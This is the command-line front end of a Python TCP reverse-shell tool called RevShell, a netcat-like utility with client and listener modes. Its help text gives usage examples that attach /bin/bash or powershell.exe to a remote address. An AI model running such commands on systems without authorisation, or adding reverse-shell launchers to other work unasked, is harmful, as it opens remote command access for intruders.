#!/usr/bin/python3
from textwrap import dedent
from argparse import (
    ArgumentParser,
    RawTextHelpFormatter
)

from multi import utils
from multi.utils import os
from multi.nodes.server import Server
from multi.nodes.client import Client

# TODO: add netcat compatibility mode


def print_help(arg_parser: ArgumentParser) -> None:
    """Print the program help menu to the console, then exit"""
    print("\nRevShell (https://github.com/vandavey/RevShell)")
    arg_parser.print_help()
    print()
    exit(0)


def missing_arg(arg_parser) -> None:
    """Print error message for missing required argument, then exit"""
    print("RevShell (https://github.com/vandavey/RevShell)")
    arg_parser.print_usage()
    print(*[
        "error:",
        "one or more of the following arguments are required:",
        "TARGET, -l/--listen\n"
    ])
    exit(1)


# noinspection PyTypeChecker
parser = ArgumentParser(
    prog="revshell",
    add_help=False,
    formatter_class=RawTextHelpFormatter,
    usage="revshell [-h] [-v] [-d] [-l] [-q] [-e EXEC] [-p PORT] TARGET",
    description="python 3 TCP reverse command shell application",
    epilog=dedent("""
        usage examples:
          revshell -lp 55236
          revshell -vlp 8152 0.0.0.0
          revshell -vp 5555 -e powershell.exe 127.0.0.1
          revshell -p 5555 -e /bin/bash 192.168.1.1
    """),
)

parser.add_argument(
    "-h", "--help", action="store_true",
    help="show this help message and exit",
    default=False
)

parser.add_argument(
    "TARGET", type=str, nargs="?",
    help="specify the remote/local IPv4 address",
    default=None
)

parser.add_argument(
    "-p", "--port", type=int,
    help="specify the TCP port to use as a socket",
    default=4444
)

parser.add_argument(
    "-e", "--exec", type=str,
    help="specify the command shell executable",
    default=None
)

parser.add_argument(
    "-l", "--listen", action="store_true",
    help="listen for incoming TCP connections",
    default=False
)

parser.add_argument(
    "-q", "--quiet", action="store_true",
    help="reduce console output as much as possible",
    default=False
)

parser.add_argument(
    "-v", "--verbose", action="store_true",
    help="be verbose with console output stream",
    default=False
)

parser.add_argument(
    "-d", "--debug", action="store_true",
    help="be verbose and output command stdout",
    default=False
)

args = parser.parse_args()

target: str = args.TARGET
port: int = args.port
shell: str = args.exec
listen: bool = args.listen
quiet: bool = args.quiet
verbose: bool = args.verbose
debug: bool = args.debug

if __name__ == "__main__":
    if args.help:
        print_help(parser)

    if (target is None) & (not listen):
        missing_arg(parser)

    utils.init_colorama()

    if target is not None:
        if not utils.valid_ipv4(target):
            utils.throw("Value for [target] is not a valid IPv4 address")
    else:
        target = "0.0.0.0"

    try:
        if not 1 <= int(port) <= 65535:
            raise ValueError()
    except ValueError:
        utils.throw("Value for [port] must be [1 <= port <= 65535]")

    if quiet:
        raise NotImplementedError("option [--quiet] is still in development")

    if verbose:
        utils.status(f"address => {target}")
        utils.status(f"port => {port}")

        if not listen:
            utils.status("node => client")
        else:
            utils.status("node => server")

    if listen:
        if shell is not None:
            server = Server(target, port, os.name, verbose, debug, shell)
        else:
            server = Server(target, port, os.name, verbose, debug)
        server.listen()
    else:
        if shell is not None:
            client = Client(target, port, os.name, verbose, debug, shell)
        else:
            client = Client(target, port, os.name, verbose, debug)
        client.connect()
